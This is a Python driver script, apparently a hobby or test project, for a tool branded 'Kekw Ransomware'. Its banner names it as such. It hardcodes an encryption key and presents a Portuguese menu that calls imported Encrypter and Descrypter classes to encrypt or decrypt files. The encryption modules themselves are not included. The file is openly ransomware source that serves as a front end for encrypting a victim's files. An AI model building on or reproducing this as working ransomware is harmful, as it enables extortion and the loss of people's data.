from encrypter import Encrypter as crypter
from descrypter import Descrypter 
import time



def op():
    print("""

         _   __     _               ______                                                     
        | | / /    | |              | ___ \                                                    
        | |/ /  ___| | ____      __ | |_/ /__ _ _ __  ___  ___  _ __ _____      _____ _ __ ___ 
        |    \ / _ \ |/ /\ \ /\ / / |    // _` | '_ \/ __|/ _ \| '_ ` _ \ \ /\ / / _ \ '__/ _ \
        | |\  \  __/   <  \ V  V /  | |\ \ (_| | | | \__ \ (_) | | | | | \ V  V /  __/ | |  __/
        \_| \_/\___|_|\_\  \_/\_/   \_| \_\__,_|_| |_|___/\___/|_| |_| |_|\_/\_/ \___|_|  \___|

        """)

def encrypt(key):
    encrypt = crypter(key)
    encrypt.encrypterFiles()

def decrypt(key):
    descrypt = Descrypter(key)
    descrypt.descrypterFiles()

def main():
    key = b"testeransomwares"
    i = True

    op()

    while i == True:
        print("""

                (1) - criptrografar arquivos
                (2) - descriptografar arquivos
                (3) - sair 

        """)

        choice = input("escolha uma opção: ")


        if choice == "1":
            encrypt(key)
        elif choice == "2":
            decrypt(key)
        elif choice == "3":
            i = False
            print("""
                    Obg :)
                    credito Ts217
                """)
        else:
            print("respota invalida")

main()
        

    

